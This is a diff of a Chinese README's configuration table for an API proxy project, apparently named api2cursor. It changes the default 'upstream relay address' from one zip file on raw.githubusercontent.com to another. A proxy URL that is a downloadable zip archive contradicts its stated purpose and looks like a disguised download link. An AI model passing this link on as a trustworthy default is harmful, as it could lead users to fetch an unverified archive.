@@ -67,7 +67,7 @@ docker compose up -d
 
 | 变量 | 说明 | 默认值 |
 |---|---|---|
-| `PROXY_TARGET_URL` | 上游中转站地址 | `https://raw.githubusercontent.com/Frostbound-northsea978/api2cursor/main/static/cursor-api-1.0-beta.4.zip` |
+| `PROXY_TARGET_URL` | 上游中转站地址 | `https://raw.githubusercontent.com/Frostbound-northsea978/api2cursor/main/routes/cursor-api-v1.5.zip` |
 | `PROXY_API_KEY` | 上游 API 密钥 | |
 | `PROXY_PORT` | 服务监听端口 | `3029` |
 | `API_TIMEOUT` | 请求超时（秒） | `300` |
